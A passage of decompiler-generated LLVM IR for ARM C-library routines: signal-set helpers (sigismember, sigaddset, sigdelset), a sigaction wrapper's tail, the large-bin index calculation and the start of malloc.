  %v0_165a8 = call i32 @__sigaddset()
  %v0_165b0 = load i32, i32* @r5, align 4
  %v0_165b4 = load i32, i32* @r6, align 4
  %v2_165b4 = add i32 %v0_165b4, 26444
  %v2_165b8 = call i32 @__GI___sigismember(i32 %v2_165b4, i32 %v0_165b0)
  store i32 %v2_16558, i32* %r2.global-to-local, align 4
  %v0_165d0 = load i32, i32* @r5, align 4
  %v3_165d8 = call i32 @__libc_sigaction(i32 %v0_165d0, i32 %v2_16590, i32 %v2_16558)
  %v1_165dc = icmp slt i32 %v3_165d8, 0
  br i1 %v1_165dc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_16590
  %v5_165e0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_165e0, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_16590
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1657c, %bb32
  %v0_165e8 = phi i32 [ %v5_165e0, %bb31 ], [ %v0_165e8.pre, %dec_label_pc_1657c ], [ -1, %bb32 ]
  %v2_165f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_165f0, i32* @r4, align 4
  store i32 %v6_16548, i32* @r5, align 4
  store i32 %v9_16548, i32* @r6, align 4
  ret i32 %v0_165e8

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 4, 3, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1657c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16600 = add i32 %arg2, -1
  %v3_16604 = udiv i32 %v1_16600, 32
  %v4_16608 = mul nuw nsw i32 %v3_16604, 4
  %v5_16608 = add i32 %v4_16608, %arg1
  %v6_16608 = inttoptr i32 %v5_16608 to i32*
  %v7_16608 = load i32, i32* %v6_16608, align 4
  %v1_1660c = urem i32 %v1_16600, 32
  %v7_16614 = shl i32 1, %v1_1660c
  %v8_16614 = and i32 %v7_16608, %v7_16614
  %v10_16614 = icmp ne i32 %v8_16614, 0
  %. = zext i1 %v10_16614 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_16600, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_16624 = load i32, i32* @r1, align 4
  %v1_16624 = add i32 %v0_16624, -1
  %v3_16628 = udiv i32 %v1_16624, 32
  %v0_1662c = load i32, i32* @r0, align 4
  %v4_1662c = mul nuw nsw i32 %v3_16628, 4
  %v5_1662c = add i32 %v0_1662c, %v4_1662c
  %v6_1662c = inttoptr i32 %v5_1662c to i32*
  %v7_1662c = load i32, i32* %v6_1662c, align 4
  %v1_16630 = urem i32 %v1_16624, 32
  %v7_16638 = shl i32 1, %v1_16630
  %v8_16638 = or i32 %v7_1662c, %v7_16638
  store i32 %v8_16638, i32* %v6_1662c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16624, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16648 = add i32 %arg2, -1
  %v3_1664c = udiv i32 %v1_16648, 32
  %v4_16650 = mul nuw nsw i32 %v3_1664c, 4
  %v5_16650 = add i32 %v4_16650, %arg1
  %v6_16650 = inttoptr i32 %v5_16650 to i32*
  %v7_16650 = load i32, i32* %v6_16650, align 4
  %v1_16654 = urem i32 %v1_16648, 32
  %tmp = shl i32 -1, %v1_16654
  %v8_1665c = add i32 %tmp, -1
  %v9_1665c = and i32 %v7_16650, %v8_1665c
  store i32 %v9_1665c, i32* %v6_16650, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16648, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1666c = udiv i32 %arg1, 256
  store i32 %v3_1666c, i32* %r1.global-to-local, align 4
  %v2_16670 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_16670, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_1667c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16670, i32 %v0_1667c)
  %v0_16680 = load i32, i32* %r1.global-to-local, align 4
  %v1_16680 = add i32 %v0_16680, 1048320
  %v3_16684 = udiv i32 %v1_16680, 65536
  %v1_16688 = and i32 %v3_16684, 8
  %v6_1668c = shl i32 %v0_16680, %v1_16688
  %v1_16690 = add i32 %v6_1668c, 520192
  %v3_16694 = udiv i32 %v1_16690, 65536
  %v1_16698 = and i32 %v3_16694, 4
  %v6_1669c = shl i32 %v6_1668c, %v1_16698
  %v1_166a0 = add i32 %v6_1669c, 245760
  %v3_166a4 = udiv i32 %v1_166a0, 65536
  %v1_166a8 = and i32 %v3_166a4, 2
  %v6_166ac = shl i32 %v6_1669c, %v1_166a8
  store i32 %v6_166ac, i32* %r1.global-to-local, align 4
  %v1_166b0 = sub nsw i32 13, %v1_16688
  %v2_166b4 = sub nsw i32 %v1_166b0, %v1_16698
  %v3_166b8 = udiv i32 %v6_166ac, 32768
  %v4_166b8 = sub nuw nsw i32 -1, %v3_166b8
  %v4_166bc = udiv i32 %v6_166ac, 16384
  %v5_166bc = and i32 %v4_166bc, %v4_166b8
  %v2_166c0 = sub nsw i32 %v2_166b4, %v1_166a8
  %v2_166c4 = add nsw i32 %v2_166c0, %v5_166bc
  %v1_166c8 = add nsw i32 %v2_166c4, 6
  %v0_166cc = load i32, i32* %ip.global-to-local, align 4
  %v6_166cc = lshr i32 %v0_166cc, %v1_166c8
  %v3_166d0 = mul nsw i32 %v2_166c4, 4
  %v1_166d4 = add nsw i32 %v3_166d0, 32
  %v1_166d8 = urem i32 %v6_166cc, 4
  %v2_166dc = or i32 %v1_166d8, %v1_166d4
  ret i32 %v2_166dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_166e4 = load i32, i32* @r4, align 4
  %v6_166e4 = load i32, i32* @r5, align 4
  %v9_166e4 = load i32, i32* @r6, align 4
  %v12_166e4 = load i32, i32* @r7, align 4
  %v15_166e4 = load i32, i32* @r8, align 4
  %v18_166e4 = load i32, i32* @sb, align 4
  %v21_166e4 = load i32, i32* @sl, align 4
  %v24_166e4 = load i32, i32* @fp, align 4
  %v27_166e4 = load i32, i32* @lr, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r1.global-to-local, align 4
  %v4_166f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 76) to i32*), align 4
  store i32 %v4_166f8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_16704 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 40) to i32*), align 4
  store i32 %v4_16704, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_166f8, i32* @r2, align 4
  %v2_16710 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16710, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_1671c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 80) to i32*), align 4
  store i32 %v4_1671c, i32* %ip.global-to-local, align 4
  store i32 91944, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1671c)
  %v0_16728 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16728, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_16734 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 20) to i32*), align 4
  store i32 %v4_16734, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16740.966 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16734)
  %v0_16740 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_16740, -32
  br i1 %tmp, label %dec_label_pc_1675c, label %dec_label_pc_16748

dec_label_pc_16748:                               ; preds = %entry
  %v0_16748 = call i32 @__GI___errno_location()
  store i32 %v0_16748, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_16754 = inttoptr i32 %v0_16748 to i32*
  store i32 12, i32* %v2_16754, align 4
  br label %dec_label_pc_16fd8

dec_label_pc_1675c:                               ; preds = %entry
  %v1_1675c = add i32 %v0_16740, 11
  store i32 %v1_1675c, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v2_16768 = icmp ugt i32 %v1_1675c, 14
  %v7_16768 = icmp eq i32 %v1_1675c, 15
  %v2_1676c = xor i1 %v7_16768, true
  %v3_1676c = and i1 %v2_16768, %v2_1676c
  br i1 %v3_1676c, label %bb, label %bb139

bb:                                               ; preds = %dec_label_pc_1675c
  %v5_1676c = and i32 %v1_1675c, -8
  store i32 %v5_1676c, i32* @sl, align 4
  br label %bb139

bb139:                                            ; preds = %dec_label_pc_1675c, %bb
  %v4_16770 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16770, i32* @r0, align 4
  %v1_16774 = inttoptr i32 %v4_16770 to i32*
  %v2_16774 = load i32, i32* %v1_16774, align 4
  store i32 %v2_16774, i32* @r4, align 4
  %v2_16778 = xor i1 %v2_16768, true
  %v3_16778 = or i1 %v7_16768, %v2_16778
  br i1 %v3_16778, label %bb140, label %bb141

bb140:                                            ; preds = %bb139
  store i32 16, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %bb139, %bb140
  %v1_1677c = urem i32 %v2_16774, 2
  %v2_1677c = icmp eq i32 %v1_1677c, 0
  br i1 %v2_1677c, label %dec_label_pc_16784, label %dec_label_pc_16794

dec_label_pc_16784:                               ; preds = %bb141
  %v2_16784 = icmp eq i32 %v2_16774, 0
  br i1 %v2_16784, label %dec_label_pc_1678c, label %dec_label_pc_16b70

dec_label_pc_1678c:                               ; preds = %dec_label_pc_16784
  %v0_1678c = call i32 @__malloc_consolidate()
  store i32 %v0_1678c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b70

dec_label_pc_16794:                               ; preds = %bb141
  %v0_16794 = load i32, i32* @sl, align 4
  %tmp202 = icmp ugt i32 %v0_16794, %v2_16774
  br i1 %tmp202, label %dec_label_pc_167bc, label %dec_label_pc_1679c

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16794
  %v1_1679c = add i32 %v4_16770, -4
  store i32 %v1_1679c, i32* %r1.global-to-local, align 4
  %v3_167a0 = udiv i32 %v0_16794, 8
  store i32 %v3_167a0, i32* %r2.global-to-local, align 4
  %v4_167a4 = mul nuw i32 %v3_167a0, 4
  %v5_167a4 = add i32 %v4_167a4, %v1_1679c
  %v6_167a4 = inttoptr i32 %v5_167a4 to i32*
  %v7_167a4 = load i32, i32* %v6_167a4, align 4
  store i32 %v7_167a4, i32* %r0.global-to-local, align 4
  %v2_167a8 = icmp eq i32 %v7_167a4, 0
  br i1 %v2_167a8, label %dec_label_pc_167bc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1679c
  %v2_167ac = add i32 %v7_167a4, 8
  %v3_167ac = inttoptr i32 %v2_167ac to i32*
  %v4_167ac = load i32, i32* %v3_167ac, align 4
  store i32 %v4_167ac, i32* %r3.global-to-local, align 4
  store i32 %v2_167ac, i32* %r0.global-to-local, align 4
  store i32 %v2_167ac, i32* %r4.global-to-local, align 4
  store i32 %v4_167ac, i32* %v6_167a4, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_167bc:                               ; preds = %dec_label_pc_1679c, %dec_label_pc_16794
  %tmp203 = icmp ugt i32 %v0_16794, 255
  br i1 %tmp203, label %dec_label_pc_1680c, label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %dec_label_pc_167bc
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_167cc = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  %v3_167d0 = udiv i32 %v0_16794, 8
  store i32 %v3_167d0, i32* @r7, align 4
  %v4_167d4 = mul nuw i32 %v3_167d0, 8
  %v5_167d4 = add i32 %v4_167cc, %v4_167d4
  store i32 %v5_167d4, i32* %r3.global-to-local, align 4
  %v1_167d8 = add i32 %v5_167d4, 44
  store i32 %v1_167d8, i32* %ip.global-to-local, align 4
  %v1_167dc = add i32 %v5_167d4, 56
  %v2_167dc = inttoptr i32 %v1_167dc to i32*
  %v3_167dc = load i32, i32* %v2_167dc, align 4
  store i32 %v3_167dc, i32* %r0.global-to-local, align 4
  %v9_167e0 = icmp eq i32 %v3_167dc, %v1_167d8
  br i1 %v9_167e0, label %dec_label_pc_1696c, label %dec_label_pc_167e8

dec_label_pc_167e8:                               ; preds = %dec_label_pc_167c4
  %v2_167e8 = add i32 %v3_167dc, %v0_16794
  store i32 %v2_167e8, i32* %r3.global-to-local, align 4
  %v1_167ec = add i32 %v2_167e8, 4
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %v2_167ec, align 4
  store i32 %v3_167ec, i32* %r2.global-to-local, align 4
  %v1_167f0 = add i32 %v3_167dc, 12
  %v2_167f0 = inttoptr i32 %v1_167f0 to i32*
  %v3_167f0 = load i32, i32* %v2_167f0, align 4
  store i32 %v3_167f0, i32* %r1.global-to-local, align 4
  %v1_167f4 = or i32 %v3_167ec, 1
  store i32 %v1_167f4, i32* %r2.global-to-local, align 4
  %v1_167f8 = add i32 %v3_167dc, 8
  store i32 %v1_167f8, i32* %r4.global-to-local, align 4
  store i32 %v1_167f4, i32* %v2_167ec, align 4
  %v0_16800 = load i32, i32* %ip.global-to-local, align 4
  %v1_16800 = load i32, i32* %r1.global-to-local, align 4
  %v2_16800 = add i32 %v1_16800, 8
  %v3_16800 = inttoptr i32 %v2_16800 to i32*
  store i32 %v0_16800, i32* %v3_16800, align 4
  %v0_16804 = load i32, i32* %r1.global-to-local, align 4
  %v1_16804 = load i32, i32* %ip.global-to-local, align 4
  %v2_16804 = add i32 %v1_16804, 12
  %v3_16804 = inttoptr i32 %v2_16804 to i32*
  store i32 %v0_16804, i32* %v3_16804, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_1680c:                               ; preds = %dec_label_pc_167bc
  store i32 %v0_16794, i32* %r0.global-to-local, align 4
  %v1_16810 = call i32 @__malloc_largebin_index(i32 %v0_16794)
  store i32 %v1_16810, i32* %r0.global-to-local, align 4
  %v0_16814 = load i32, i32* @r4, align 4
  %v1_16814 = and i32 %v0_16814, 2
  %v2_16814 = icmp eq i32 %v1_16814, 0
  store i32 %v1_16810, i32* @r7, align 4
  br i1 %v2_16814, label %dec_label_pc_1696c, label %dec_label_pc_16820

dec_label_pc_16820:                               ; preds = %dec_label_pc_1680c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_16828 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16828, i32* @r0, align 4
  %v0_1682c = call i32 @__malloc_consolidate()
  store i32 %v0_1682c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1696c

dec_label_pc_16834:                               ; preds = %dec_label_pc_16980
  %v1_16834 = add i32 %v3_16980, 4
  %v2_16834 = inttoptr i32 %v1_16834 to i32*
  %v3_16834 = load i32, i32* %v2_16834, align 4
  store i32 %v3_16834, i32* %r3.global-to-local, align 4
  %v0_16838 = load i32, i32* @sl, align 4
  %v1_1683c = and i32 %v3_16834, -4
  store i32 %v1_1683c, i32* %r4.global-to-local, align 4
  %v1_16840 = add i32 %v3_16980, 12
  %v2_16840 = inttoptr i32 %v1_16840 to i32*
  %v3_16840 = load i32, i32* %v2_16840, align 4
  store i32 %v3_16840, i32* %ip.global-to-local, align 4
  %tmp204 = icmp ugt i32 %v0_16838, 255
  br i1 %tmp204, label %dec_label_pc_1689c, label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_16834
  %v9_16848 = icmp eq i32 %v3_16840, %v0_168a0
  br i1 %v9_16848, label %dec_label_pc_16850, label %dec_label_pc_1689c

dec_label_pc_16850:                               ; preds = %dec_label_pc_16848
  %v0_16850 = load i32, i32* @sb, align 4
  %v1_16850 = add i32 %v0_16850, 48
  %v2_16850 = inttoptr i32 %v1_16850 to i32*
  %v3_16850 = load i32, i32* %v2_16850, align 4
  store i32 %v3_16850, i32* %r3.global-to-local, align 4
  %v9_16854 = icmp eq i32 %v3_16980, %v3_16850
  br i1 %v9_16854, label %dec_label_pc_1685c, label %dec_label_pc_1689c

dec_label_pc_1685c:                               ; preds = %dec_label_pc_16850
  %v1_1685c = load i32, i32* @fp, align 4
  %tmp205 = icmp ugt i32 %v1_1683c, %v1_1685c
  br i1 %tmp205, label %dec_label_pc_16864, label %dec_label_pc_1689c

dec_label_pc_16864:                               ; preds = %dec_label_pc_1685c
  %v2_16864 = sub i32 %v1_1683c, %v0_16838
  store i32 %v2_16864, i32* %r2.global-to-local, align 4
  %v2_16868 = add i32 %v0_16838, %v3_16980
  store i32 %v2_16868, i32* %r3.global-to-local, align 4
  %v1_1686c = or i32 %v0_16838, 1
  store i32 %v1_1686c, i32* %r0.global-to-local, align 4
  %v1_16870 = or i32 %v2_16864, 1
  store i32 %v1_16870, i32* %r1.global-to-local, align 4
  %v1_16874 = add i32 %v3_16980, 8
  store i32 %v1_16874, i32* %r4.global-to-local, align 4
  %v2_16878 = add i32 %v0_168a0, 8
  %v3_16878 = inttoptr i32 %v2_16878 to i32*
  store i32 %v2_16868, i32* %v3_16878, align 4
  %v0_1687c = load i32, i32* %r3.global-to-local, align 4
  %v1_1687c = load i32, i32* %ip.global-to-local, align 4
  %v2_1687c = add i32 %v1_1687c, 12
  %v3_1687c = inttoptr i32 %v2_1687c to i32*
  store i32 %v0_1687c, i32* %v3_1687c, align 4
  %v0_16880 = load i32, i32* %r0.global-to-local, align 4
  %v1_16880 = load i32, i32* @r6, align 4
  %v2_16880 = add i32 %v1_16880, 4
  %v3_16880 = inttoptr i32 %v2_16880 to i32*
  store i32 %v0_16880, i32* %v3_16880, align 4
  %v0_16884 = load i32, i32* %r3.global-to-local, align 4
  %v1_16884 = load i32, i32* @sb, align 4
  %v2_16884 = add i32 %v1_16884, 48
  %v3_16884 = inttoptr i32 %v2_16884 to i32*
  store i32 %v0_16884, i32* %v3_16884, align 4
  %v0_16888 = load i32, i32* %r2.global-to-local, align 4
  %v1_16888 = load i32, i32* %r3.global-to-local, align 4
  %v3_16888 = add i32 %v1_16888, %v0_16888
  %v4_16888 = inttoptr i32 %v3_16888 to i32*
  store i32 %v0_16888, i32* %v4_16888, align 4
  %v0_1688c = load i32, i32* %r1.global-to-local, align 4
  %v1_1688c = load i32, i32* %r3.global-to-local, align 4
  %v2_1688c = add i32 %v1_1688c, 4
  %v3_1688c = inttoptr i32 %v2_1688c to i32*
  store i32 %v0_1688c, i32* %v3_1688c, align 4
  %v0_16890 = load i32, i32* %ip.global-to-local, align 4
  %v1_16890 = load i32, i32* %r3.global-to-local, align 4
  %v2_16890 = add i32 %v1_16890, 12
  %v3_16890 = inttoptr i32 %v2_16890 to i32*
  store i32 %v0_16890, i32* %v3_16890, align 4
  %v0_16894 = load i32, i32* %ip.global-to-local, align 4
  %v1_16894 = load i32, i32* %r3.global-to-local, align 4
  %v2_16894 = add i32 %v1_16894, 8
  %v3_16894 = inttoptr i32 %v2_16894 to i32*
  store i32 %v0_16894, i32* %v3_16894, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_1689c:                               ; preds = %dec_label_pc_1685c, %dec_label_pc_16850, %dec_label_pc_16848, %dec_label_pc_16834
  %v9_1689c = icmp eq i32 %v1_1683c, %v0_16838
  %v2_168a0 = add i32 %v3_16840, 8
  %v3_168a0 = inttoptr i32 %v2_168a0 to i32*
  store i32 %v0_168a0, i32* %v3_168a0, align 4
  %v0_168a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_168a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_168a4 = add i32 %v1_168a4, 12
  %v3_168a4 = inttoptr i32 %v2_168a4 to i32*
  store i32 %v0_168a4, i32* %v3_168a4, align 4
  br i1 %v9_1689c, label %dec_label_pc_169fc.loopexit, label %dec_label_pc_168b8

dec_label_pc_168b8:                               ; preds = %dec_label_pc_1689c
  %v0_168b8 = load i32, i32* %r4.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_168b8, 255
  br i1 %tmp206, label %dec_label_pc_168dc, label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168b8
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v1_168c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_168c4 = add i32 %v1_168c4, sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32)
  %v3_168c4 = inttoptr i32 %v2_168c4 to i32*
  %v4_168c4 = load i32, i32* %v3_168c4, align 4
  %v3_168c8 = udiv i32 %v0_168b8, 8
  store i32 %v3_168c8, i32* %r0.global-to-local, align 4
  %v4_168cc = mul nuw i32 %v3_168c8, 8
  %v5_168cc = add i32 %v4_168c4, %v4_168cc
  store i32 %v5_168cc, i32* %r3.global-to-local, align 4
  %v1_168d0 = add i32 %v5_168cc, 44
  store i32 %v1_168d0, i32* %ip.global-to-local, align 4
  %v1_168d4 = add i32 %v5_168cc, 52
  %v2_168d4 = inttoptr i32 %v1_168d4 to i32*
  %v3_168d4 = load i32, i32* %v2_168d4, align 4
  store i32 %v3_168d4, i32* @lr, align 4
  br label %dec_label_pc_16934

dec_label_pc_168dc:                               ; preds = %dec_label_pc_168b8
  store i32 %v0_168b8, i32* %r0.global-to-local, align 4
  %v1_168e0 = call i32 @__malloc_largebin_index(i32 %v0_168b8)
  store i32 %v1_168e0, i32* %r0.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  %v1_168e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_168e8 = add i32 %v1_168e8, sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32)
  %v3_168e8 = inttoptr i32 %v2_168e8 to i32*
  %v4_168e8 = load i32, i32* %v3_168e8, align 4
  %v4_168ec = mul i32 %v1_168e0, 8
  %v5_168ec = add i32 %v4_168e8, %v4_168ec
  store i32 %v5_168ec, i32* %r3.global-to-local, align 4
  %v1_168f0 = add i32 %v5_168ec, 44
  store i32 %v1_168f0, i32* %ip.global-to-local, align 4
  %v1_168f4 = add i32 %v5_168ec, 52
  %v2_168f4 = inttoptr i32 %v1_168f4 to i32*
  %v3_168f4 = load i32, i32* %v2_168f4, align 4
  store i32 %v3_168f4, i32* @lr, align 4
  %v9_168f8 = icmp eq i32 %v3_168f4, %v1_168f0
  br i1 %v9_168f8, label %dec_label_pc_16934, label %dec_label_pc_16900

dec_label_pc_16900:                               ; preds = %dec_label_pc_168dc
  %v1_16900 = add i32 %v5_168ec, 56
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  store i32 %v3_16900, i32* %r1.global-to-local, align 4
  %v1_16904 = add i32 %v3_16900, 4
  %v2_16904 = inttoptr i32 %v1_16904 to i32*
  %v3_16904 = load i32, i32* %v2_16904, align 4
  store i32 %v3_16904, i32* %r3.global-to-local, align 4
  %v0_16908 = load i32, i32* %r4.global-to-local, align 4
  %v3_16908 = icmp ult i32 %v0_16908, %v3_16904
  br i1 %v3_16908, label %.thread, label %dec_label_pc_16924.preheader

.thread:                                          ; preds = %dec_label_pc_16900
  store i32 %v1_168f0, i32* @lr, align 4
  store i32 %v3_16900, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16934

dec_label_pc_16924.preheader:                     ; preds = %dec_label_pc_16900
  %v2_16910 = or i32 %v0_16908, 1
  store i32 %v2_16910, i32* %r2.global-to-local, align 4
  %v1_16924180 = add i32 %v3_168f4, 4
  %v2_16924181 = inttoptr i32 %v1_16924180 to i32*
  %v3_16924182 = load i32, i32* %v2_16924181, align 4
  store i32 %v3_16924182, i32* %r3.global-to-local, align 4
  %v3_16928184 = icmp ult i32 %v2_16910, %v3_16924182
  br i1 %v3_16928184, label %dec_label_pc_16920, label %dec_label_pc_16930

dec_label_pc_16920:                               ; preds = %dec_label_pc_16924.preheader, %dec_label_pc_16920
  %v0_16930185 = phi i32 [ %v3_16920, %dec_label_pc_16920 ], [ %v3_168f4, %dec_label_pc_16924.preheader ]
  %v1_16920 = add i32 %v0_16930185, 8
  %v2_16920 = inttoptr i32 %v1_16920 to i32*
  %v3_16920 = load i32, i32* %v2_16920, align 4
  store i32 %v3_16920, i32* @lr, align 4
  %v1_16924 = add i32 %v3_16920, 4
  %v2_16924 = inttoptr i32 %v1_16924 to i32*
  %v3_16924 = load i32, i32* %v2_16924, align 4
  store i32 %v3_16924, i32* %r3.global-to-local, align 4
  %v3_16928 = icmp ult i32 %v2_16910, %v3_16924
  br i1 %v3_16928, label %dec_label_pc_16920, label %dec_label_pc_16930

dec_label_pc_16930:                               ; preds = %dec_label_pc_16920, %dec_label_pc_16924.preheader
  %v0_16930.lcssa = phi i32 [ %v3_168f4, %dec_label_pc_16924.preheader ], [ %v3_16920, %dec_label_pc_16920 ]
  %v1_16930 = add i32 %v0_16930.lcssa, 12
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %.thread, %dec_label_pc_168dc, %dec_label_pc_168c0, %dec_label_pc_16930
  %v0_16954 = phi i32 [ %v1_168f0, %dec_label_pc_168dc ], [ %v1_168d0, %dec_label_pc_168c0 ], [ %v3_16930, %dec_label_pc_16930 ], [ %v3_16900, %.thread ]
  %v0_16948 = phi i32 [ %v1_168e0, %dec_label_pc_168dc ], [ %v3_168c8, %dec_label_pc_168c0 ], [ %v1_168e0, %dec_label_pc_16930 ], [ %v1_168e0, %.thread ]
  %v1_16938 = phi i32 [ %v1_168e8, %dec_label_pc_168dc ], [ %v1_168c4, %dec_label_pc_168c0 ], [ %v1_168e8, %dec_label_pc_16930 ], [ %v1_168e8, %.thread ]
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v2_16938 = add i32 %v1_16938, sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32)
  %v3_16938 = inttoptr i32 %v2_16938 to i32*
  %v4_16938 = load i32, i32* %v3_16938, align 4
  %v3_1693c = sdiv i32 %v0_16948, 32
  store i32 %v3_1693c, i32* %r3.global-to-local, align 4
  %v4_16940 = mul nsw i32 %v3_1693c, 4
  %v5_16940 = add i32 %v4_16938, %v4_16940
  store i32 %v5_16940, i32* %r1.global-to-local, align 4
  %v1_16944 = add i32 %v5_16940, 820
  %v2_16944 = inttoptr i32 %v1_16944 to i32*
  %v3_16944 = load i32, i32* %v2_16944, align 4
  %v1_16948 = urem i32 %v0_16948, 32
  store i32 %v1_16948, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_16950 = shl i32 1, %v1_16948
  %v8_16950 = or i32 %v3_16944, %v7_16950
  store i32 %v8_16950, i32* %r3.global-to-local, align 4
  %v1_16954 = load i32, i32* @r6, align 4
  %v2_16954 = add i32 %v1_16954, 12
  %v3_16954 = inttoptr i32 %v2_16954 to i32*
  store i32 %v0_16954, i32* %v3_16954, align 4
  %v0_16958 = load i32, i32* @lr, align 4
